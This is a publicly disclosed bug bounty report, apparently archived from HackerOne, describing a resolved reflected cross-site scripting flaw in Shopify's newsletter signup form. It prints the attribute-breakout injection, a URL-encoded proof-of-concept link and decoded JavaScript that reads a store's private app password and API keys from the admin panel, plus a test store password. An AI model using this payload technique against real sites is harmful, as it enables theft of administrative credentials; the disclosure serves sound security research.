---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
date: 2019-10-11
submitted: 2019-10-08T02:36:01.197Z
bounty_usd: 2000
votes: 79
cve: []
program: "[[programs/shopify|Shopify]]"
reporter: "gam817"
source: "https://hackerone.com/reports/709336"
title: "Reflective Cross-site Scripting via Newsletter Form"
---
# Reflective Cross-site Scripting via Newsletter Form

> **Severity:** High | **Bounty:** 2,000 USD | **Votes:** 79 | **Program:** Shopify | **Disclosed:** 2019-10-11

- Report: [https://hackerone.com/reports/709336](https://hackerone.com/reports/709336)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2019-10-08T02:36:01.197Z

## Report summary

This is a reflective cross-site scripting in the newsletter signup feature of *.myshopify.com websites. It involves a filter bypass by using Ruby-on-Rails mass assignment to insert quotes (") which are not user supplied and therefore are not being filtered by the application.

This allows escaping the value attribute on an input tag to add an onfocus attribute which contains javascript and finishing it off with an autofocus to trigger the event on page load.

Extra spaces and square brackets "[]" were causing the payload to fail which made it difficult to retrieve sensitive data from requests to the admin panel. This was circumvented by using "split", "slice", "pop" and "shift" to move around the response data to grab administrative API keys from the /admin/apps endpoint.

## Timeline

- **Report Filed**
- **2019-10-08** @gam817: the password to the store is: fohclo
- **2019-10-08** @gam817: The following shows how the HTML is constructed, it appears to be a side-effect of RoR mass assignment (turning the values into { "key" => "value" } which in turn results in unescaped quotes.

```html
                      <input type="email"
                        name="contact[email]"
                        id="ContactFooter-email"
                        class="input-group__field newsletter__input input--error"
                        value="{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}"
                        placeholder="Email address"
                        aria-label="Email address"
                        aria-required="true"
                        required
                        autocorrect="off"
                        autocapitalize="off"
                        
                          aria-invalid="true"
                          aria-describedby="ContactFooter-email-error"
                          data-form-status
                        >
```

following the form of { " onfocus=javascript:alert('xss') autofocus a" => "a" } which breaks out of the value field.
- **2019-10-08** @gam817: The following PoC shows how this could be used to compromise administrative API keys in a private app:

```https://bugbountyayo.myshopify.com/?contact[email] onfocus%3djavascript:%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%27%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%2b%64%61%74%61%2e%73%70%6c%69%74%28%27%68%72%65%66%3d%22%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%61%6c%65%72%74%28%64%61%74%61%2e%73%70%6c%69%74%28%27%69%64%3d%22%70%72%69%76%61%74%65%5f%61%70%70%5f%70%61%73%73%77%6f%72%64%22%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%76%61%6c%75%65%3d%22%27%29%2e%73%6c%69%63%65%28%31%29%2e%73%68%69%66%74%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%29%7d%29%29%7d%29%7d%29%29%7d%29 autofocus a=a&form_type[a]aaa```

Which decodes to this (as a one-liner with no spaces, formmating for ease of reading, kind of.. lol):
```javascript
// make request to private apps to get the ID of a private app
fetch('/admin/apps/private', { headers:{'X-Shopify-Web':1} })
  .then(function(data){
      console.log(data.text().then(function(data){
          // make a request to the private app we grabbed an id for
          fetch('/admin/apps/private/'+data.split('href="/admin/apps/private/').pop().split('"').shift(), { headers:{'X-Shopify-Web':1} })
             .then(function(data){
                 // parse out the password for this app (also able to parse api keys)
                 console.log(data.text().then(function(data{
    alert(data.split('id="private_app_password"').pop().split('value="').slice(1).shift().split('"').shift())
}))})}))})
```

PoC screenshots included
- **Report Triaged**
- **Bounty Awarded**
- **2019-10-09** @gam817: Thanks! I was sure I accidentally reported to Spotify when I saw your username haha. Well played sir.
- **Report Resolved**
- **2019-10-11** @gam817: Thank you @clayton. I tested it again and all fixed. Thanks for your time!!
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
